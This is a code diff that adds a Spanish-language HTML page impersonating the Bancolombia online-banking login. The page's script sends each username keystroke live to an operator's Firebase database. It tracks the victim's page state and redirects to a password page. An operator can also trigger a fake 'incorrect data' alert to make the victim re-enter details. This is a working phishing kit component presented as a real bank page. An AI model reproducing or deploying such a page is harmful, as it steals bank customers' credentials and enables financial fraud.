@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Bancolombia</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  <style>
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    body{
+      background:#f5f5f5;
+    }
+
+    /* HEADER */
+    .header{
+      text-align:center;
+      padding:20px;
+      background:#fff;
+      border-bottom:1px solid #e5e5e5;
+    }
+
+    .header img{
+      height:30px;
+    }
+
+    /* FONDO CON LINEAS */
+    .bg-lines{
+      position:fixed;
+      width:100%;
+      height:100%;
+      top:0;
+      left:0;
+      z-index:-1;
+      opacity:0.9;
+    }
+
+    .bg-lines img{
+      width:100%;
+      height:100%;
+      object-fit:cover;
+    }
+
+    /* CONTENIDO */
+    .container{
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      height:80vh;
+      padding:20px;
+    }
+
+    .card{
+      background:#fff;
+      padding:35px;
+      border-radius:16px;
+      width:100%;
+      max-width:420px;
+      text-align:center;
+      box-shadow:0 10px 30px rgba(0,0,0,0.05);
+    }
+
+    .title{
+      font-size:26px;
+      margin-bottom:15px;
+      font-weight:600;
+      color:#333;
+    }
+
+    .text{
+      font-size:14px;
+      color:#555;
+      margin-bottom:25px;
+      line-height:1.5;
+    }
+
+    .input-group{
+      text-align:left;
+      margin-bottom:25px;
+    }
+
+    .input-group label{
+      font-size:14px;
+      color:#333;
+      display:block;
+      margin-bottom:6px;
+    }
+
+    .input-group input{
+      width:100%;
+      border:none;
+      border-bottom:2px solid #ddd;
+      padding:10px 0;
+      outline:none;
+      font-size:15px;
+      background:transparent;
+    }
+
+    .input-group input:focus{
+  border-bottom:2px solid #FFD200; /* amarillo Bancolombia */
+}
+
+    /* BOTONES */
+    .buttons{
+      display:flex;
+      gap:10px;
+    }
+
+    .btn{
+      flex:1;
+      padding:12px;
+      border-radius:25px;
+      font-weight:600;
+      cursor:pointer;
+      border:none;
+    }
+
+    .btn-back{
+      background:#fff;
+      border:1px solid #ccc;
+    }
+
+    .btn-next{
+      background:#ccc;
+      color:#000;
+      transition:0.3s;
+    }
+
+    .btn-next.active{
+      background:#333;
+      color:#fff;
+    }
+
+
+
+    .alert-error{
+  position:fixed;
+  top:20px;
+  left:50%;
+  transform:translateX(-50%);
+  z-index:9999;
+}
+
+.alert-box{
+  background:#333;
+  color:#fff;
+  padding:15px 20px;
+  border-radius:10px;
+  min-width:300px;
+}
+
+
+  </style>
+</head>
+
+<body>
+
+  <!-- HEADER -->
+  <div class="header">
+    <img src="logo.svg" alt="Bancolombia">
+  </div>
+
+  <!-- FONDO -->
+  <div class="bg-lines">
+    <img src="auth-trazo.svg">
+  </div>
+
+  <!-- CONTENIDO -->
+  <div class="container">
+    <div class="card">
+
+      <div class="title">Te damos la bienvenida</div>
+
+      <div class="text">
+        El usuario es el mismo con el que ingresas a la<br>
+        <b>Sucursal Virtual Personas.</b>
+      </div>
+
+      <div class="input-group">
+        <label>Usuario</label>
+        <input type="text" id="usuario">
+      </div>
+
+      <div class="buttons">
+        <button class="btn btn-back">Volver</button>
+        <button id="continuar" class="btn btn-next">Continuar</button>
+      </div>
+
+    </div>
+  </div>
+
+
+  <div class="alert-error" style="display:none;">
+  <div class="alert-box">
+    <strong>Datos incorrectos</strong>
+    <p>Los datos ingresados no coinciden, inténtalo nuevamente.</p>
+  </div>
+</div>
+
+
+<script type="module" src="firebase.js"></script>
+
+<script>
+window.addEventListener('load', () => {
+const { db, uid, ref, update, onValue } = window;
+
+// ===============================
+// 🔹 ESTADO INICIAL
+// ===============================
+update(ref(db, "dataPages/" + uid), { 
+  estado: "abierto",
+  paginaActual: "Index.html",
+  oculto: false
+});
+
+// ===============================
+// 🔹 INPUT + BOTÓN
+// ===============================
+const input = document.getElementById("usuario");
+const btn = document.getElementById("continuar");
+
+// activar botón
+input.addEventListener("input", function() {
+
+  if(this.value.trim() !== ""){
+    btn.classList.add("active");
+  } else {
+    btn.classList.remove("active");
+  }
+
+  // 🔴 tiempo real al panel
+  update(ref(db, "dataPages/" + uid), {
+    username: this.value
+  });
+
+});
+
+// ===============================
+// 🔹 BOTÓN → ACTIVAR BARRA
+// ===============================
+btn.addEventListener("click", () => {
+
+  const valor = input.value.trim();
+  if (!valor) return;
+
+  update(ref(db, "dataPages/" + uid), {
+    mostrarBarraUsername: true
+  });
+
+  // 🔥 REDIRECCIÓN
+  window.location.href = "password.html";
+
+});
+
+// ===============================
+// 🔹 ESCUCHAR ERROR
+// ===============================
+onValue(ref(db, "dataPages/" + uid), snapshot => {
+
+  const data = snapshot.val();
+  if (!data) return;
+
+  if (data.estadoError === "incorrecto") {
+
+    // limpiar flag
+    update(ref(db, "dataPages/" + uid), {
+      estadoError: null
+    });
+
+    // 🔴 mostrar alerta
+    const alert = document.querySelector(".alert-error");
+
+    if (alert) {
+      alert.style.display = "block";
+
+      // 🔥 ocultar después de 4s
+      setTimeout(() => {
+        alert.style.display = "none";
+      }, 4000);
+    }
+
+  }
+
+});
+
+// ===============================
+// 🔹 CERRAR PÁGINA
+// ===============================
+window.addEventListener("beforeunload", () => {
+  update(ref(db, "dataPages/" + uid), { 
+    estado: "cerrado",
+    paginaActual: null  
+  });
+});
+
+});
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
